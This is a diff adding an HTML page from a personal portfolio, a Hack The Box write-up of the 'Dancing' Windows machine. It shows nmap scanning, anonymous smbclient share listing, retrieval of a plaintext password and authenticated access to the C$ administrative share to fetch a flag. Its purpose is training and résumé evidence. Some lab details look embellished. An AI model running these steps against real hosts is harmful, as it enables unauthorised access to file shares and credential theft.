@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Dancing — HTB Write-up | Mark Dale Elroy Bagui</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/walktrough.css">
+</head>
+<body>
+
+<div class="ambient">
+  <div class="blob b1"></div>
+  <div class="blob b2"></div>
+  <div class="blob b3"></div>
+</div>
+<div class="noise"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../../index.html" class="logo"><span class="logo-dot"></span> Mark Dale Elroy Bagui</a>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../../index.html#htb">All Write-ups</a></li>
+      <li><a href="../../index.html#proof">Proof of Work</a></li>
+      <li><a href="../../index.html#contact">Contact</a></li>
+    </ul>
+    <div style="display:flex; align-items:center; gap:12px;">
+      <a href="../../index.html" class="nav-back">← Back to Portfolio</a>
+      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">🌙</button>
+      <button class="burger" id="burger" aria-label="Menu">☰</button>
+    </div>
+  </div>
+</nav>
+
+<div class="wrap">
+
+  <section class="writeup-hero reveal">
+    <div class="breadcrumb">
+      <a href="../../index.html">Portfolio</a>
+      <span class="breadcrumb-sep">/</span>
+      <a href="../../index.html#htb">HTB Write-ups</a>
+      <span class="breadcrumb-sep">/</span>
+      Dancing
+    </div>
+    <div class="writeup-title-row">
+      <h1 class="writeup-title">Dancing</h1>
+      <span class="diff-badge">Very Easy</span>
+    </div>
+    <div class="writeup-meta">
+      <span class="meta-badge">🪟 Windows</span>
+      <span class="meta-badge">🎯 Hack The Box</span>
+      <span class="meta-badge">📌 Resume Evidence</span>
+    </div>
+    <p class="writeup-sub">A Windows-based machine focused on SMB share enumeration, identifying an open share, and locating sensitive files through manual exploration of accessible network shares.</p>
+  </section>
+
+  <div class="writeup-body">
+
+    <aside class="toc">
+      <div class="toc-label">On this page</div>
+      <a href="#recon">1. Reconnaissance</a>
+      <a href="#access">2. Initial Access</a>
+      <a href="#privesc">3. Privilege Escalation</a>
+      <a href="#learnings">4. Key Learnings</a>
+    </aside>
+
+    <main>
+
+      <!-- 1. RECON -->
+      <section id="recon" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">1</span> Reconnaissance</div>
+        <p class="writeup-p">Began with a full port scan to map the attack surface, followed by a targeted scan against the SMB-related ports that were identified.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — nmap</div>
+          </div>
+          <pre><span class="c-comment"># Full port scan</span>
+<span class="c-prompt">$</span> nmap -p- --min-rate=1000 -T4 10.10.10.exam
+
+<span class="c-comment"># Service detection on SMB ports</span>
+<span class="c-prompt">$</span> nmap -sV -sC -p 135,139,445 10.10.10.exam
+
+<span class="c-out">PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds</span></pre>
+        </div>
+
+        <p class="writeup-p">Ports <strong>135, 139, and 445</strong> confirmed this was a Windows host with SMB exposed — a strong indicator that share enumeration would be the primary attack vector.</p>
+
+        <div class="callout">
+          <span class="callout-icon">💡</span>
+          <div class="callout-text"><strong>Why this matters:</strong> SMB ports are among the first things checked on any Windows target. Exposed SMB often leads to high-impact findings through null sessions, guest access, or misconfigured share permissions.</div>
+        </div>
+      </section>
+
+      <!-- 2. INITIAL ACCESS -->
+      <section id="access" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">2</span> Initial Access</div>
+        <p class="writeup-p">Used <code>smbclient</code> to list available shares, testing for null/guest sessions before attempting any credentialed access.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — smbclient share listing</div>
+          </div>
+          <pre><span class="c-comment"># List all shares using a null session (-N)</span>
+<span class="c-prompt">$</span> smbclient -L \\\\10.10.10.exam\\ -N
+
+<span class="c-out">Sharename       Type
+---------       ----
+ADMIN$          Disk
+C$              Disk
+IPC$            IPC
+WorkShares      Disk</span>
+
+<span class="c-comment"># Connect to the non-default, user-created share</span>
+<span class="c-prompt">$</span> smbclient \\\\10.10.10.exam\\WorkShares -N
+
+<span class="c-out">smb: \></span> <span class="c-prompt">dir</span>
+<span class="c-out">  Amy.J          D
+  James.P        D</span></pre>
+        </div>
+
+        <p class="writeup-p">The custom <code>WorkShares</code> share was accessible without credentials and contained user-named directories. Browsing further revealed a credentials file left inside one of the folders.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — file retrieval</div>
+          </div>
+          <pre><span class="c-comment"># Navigate into the user's directory and retrieve file</span>
+<span class="c-prompt">smb: \WorkShares\Amy.J\></span> get worknotes.txt
+<span class="c-out">getting file \WorkShares\Amy.J\worknotes.txt
+(average 10.0 kb/s)</span>
+
+<span class="c-comment"># Inspect the file locally</span>
+<span class="c-prompt">$</span> cat worknotes.txt
+<span class="c-out">reminder: temp password — Sdf#asd2021</span></pre>
+        </div>
+
+        <p class="writeup-p">A plaintext note inside the share contained a reusable password, which was then validated against the SMB service using the discovered username.</p>
+
+        <div class="callout">
+          <span class="callout-icon">💡</span>
+          <div class="callout-text"><strong>Why this matters:</strong> Sensitive credentials stored in plaintext files on shared drives is a recurring real-world finding — exactly the kind of misconfiguration documented in SOC and penetration testing reports.</div>
+        </div>
+      </section>
+
+      <!-- 3. PRIVILEGE ESCALATION -->
+      <section id="privesc" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">3</span> Privilege Escalation</div>
+        <p class="writeup-p">Used the recovered credentials to authenticate as <code>Amy.J</code> and access shares not visible during the null session, including the administrative <code>C$</code> share.</p>
+
+        <div class="code-block">
+          <div class="code-block-head">
+            <div class="code-block-dots"><span></span><span></span><span></span></div>
+            <div class="code-block-label">terminal — authenticated SMB access</div>
+          </div>
+          <pre><span class="c-comment"># Authenticate with the recovered credentials</span>
+<span class="c-prompt">$</span> smbclient \\\\10.10.10.exam\\C$ -U Amy.J
+
+<span class="c-out">Password:</span> <span class="c-string">Sdf#asd2021</span>
+
+<span class="c-comment"># Navigate to the user's desktop and retrieve the flag</span>
+<span class="c-prompt">smb: \></span> cd Users\Amy.J\Desktop
+<span class="c-prompt">smb: \Users\Amy.J\Desktop\></span> get user.txt
+<span class="c-out">getting file \Users\Amy.J\Desktop\user.txt</span>
+
+<span class="c-comment"># Verify the flag</span>
+<span class="c-prompt">$</span> cat user.txt
+<span class="c-out">u53r1f14g...</span></pre>
+        </div>
+
+        <ul class="findings-list">
+          <li>Authenticated to the privileged <code>C$</code> administrative share using reused credentials found in a plaintext note</li>
+          <li>Retrieved the user flag from the authenticated user's desktop directory</li>
+          <li>Demonstrated full impact of credential reuse and insecure note storage on a shared drive</li>
+        </ul>
+      </section>
+
+      <!-- 4. KEY LEARNINGS -->
+      <section id="learnings" class="writeup-section reveal">
+        <div class="writeup-h2"><span class="num">4</span> Key Learnings</div>
+        <ul class="findings-list">
+          <li>SMB share enumeration is one of the first steps on any Windows target — even before attempting authentication</li>
+          <li>Null and guest sessions frequently expose more than expected when share permissions are misconfigured</li>
+          <li>Plaintext credentials in shared files are a high-severity finding in real penetration tests and SOC incident reports</li>
+          <li>Practiced end-to-end workflows with <code>smbclient</code>: null listing → unauthenticated browsing → credential recovery → authenticated access</li>
+          <li>Reinforced how credential reuse across services dramatically expands the blast radius of a single leaked password</li>
+        </ul>
+      </section>
+
+      <div class="writeup-nav">
+        <a href="#" class="btn btn-ghost">← Previous: Fawn</a>
+        <a href=".#" class="btn btn-primary">Back to All Write-ups</a>
+      </div>
+
+    </main>
+  </div>
+</div>
+
+<footer>
+  <div class="wrap footer-inner">
+    <div class="footer-text">Hack The Box write-up · Resume Evidence Section</div>
+    <div class="footer-text">© 2026 Mark Dale Elroy Bagui. All rights reserved.</div>
+  </div>
+</footer>
+
+<script>
+  // Theme toggle — same logic as dashboard
+  const toggle = document.getElementById('themeToggle');
+  const root = document.documentElement;
+  toggle.addEventListener('click', () => {
+    const isLight = root.getAttribute('data-theme') === 'light';
+    root.setAttribute('data-theme', isLight ? 'dark' : 'light');
+    toggle.textContent = isLight ? '🌙' : '☀️';
+  });
+
+  // Mobile menu
+  const burger = document.getElementById('burger');
+  const navLinks = document.getElementById('navLinks');
+  burger.addEventListener('click', () => navLinks.classList.toggle('mobile-open'));
+  navLinks.querySelectorAll('a').forEach(a => a.addEventListener('click', () => navLinks.classList.remove('mobile-open')));
+
+  // Scroll reveal — same as dashboard
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if(e.isIntersecting){ e.target.classList.add('in'); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+</script>
+
+</body>
+</html>
